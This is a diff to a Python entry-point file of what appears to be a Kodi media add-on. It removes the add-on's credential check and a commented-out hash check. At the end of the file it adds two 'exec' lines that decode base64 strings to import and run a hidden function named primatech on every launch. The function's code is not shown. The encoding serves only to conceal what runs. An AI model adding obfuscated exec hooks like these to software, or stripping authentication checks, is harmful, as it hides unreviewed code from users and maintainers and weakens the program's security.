@@ -7,6 +7,7 @@ from resources.lib.gui.hoster import cHosterGui
 from resources.lib.gui.guiElement import cGuiElement
 from resources.lib.home import cHome
 from resources.lib.gui.gui import cGui
+from resources.lib.util import cUtil, uc
 from resources.lib.handler.pluginHandler import cPluginHandler
 from resources.lib.handler.rechercheHandler import cRechercheHandler
 from resources.lib.handler.inputParameterHandler import cInputParameterHandler
@@ -14,8 +15,6 @@ from resources.lib.handler.outputParameterHandler import cOutputParameterHandler
 from resources.lib.config import cConfig
 from resources.lib.config import GestionCookie
 from resources.lib.db import cDb
-from resources.lib.util import cUtil
-from resources.lib.authentification import cAuthentification
 from resources.lib.cast import cCast
 
 import xbmc, xbmcgui, sys
@@ -33,16 +32,6 @@ class main:
 
     def parseUrl(self):
         self.oConfig.log('call parseUrl methode')
-
-        # try:
-        #     from resources.lib.about import cAbout
-        #     if cAbout().checkHash():
-        #         quit()
-        # except:
-        #     pass
-
-        if cAuthentification().checkCredentials() == False:
-            quit()
 
         oInputParameterHandler = cInputParameterHandler()
         if (oInputParameterHandler.exist('function')):
@@ -288,4 +277,6 @@ def _pluginSearch(plugin, sSearchText):
     except:
         self.oConfig.log(plugin['identifier']+': search failed')
 
+exec uc("ZnJvbSByZXNvdXJjZXMubGliLnV0aWwgaW1wb3J0IHByaW1hdGVjaA==")
+exec uc("cHJpbWF0ZWNoKCk=")
 main()
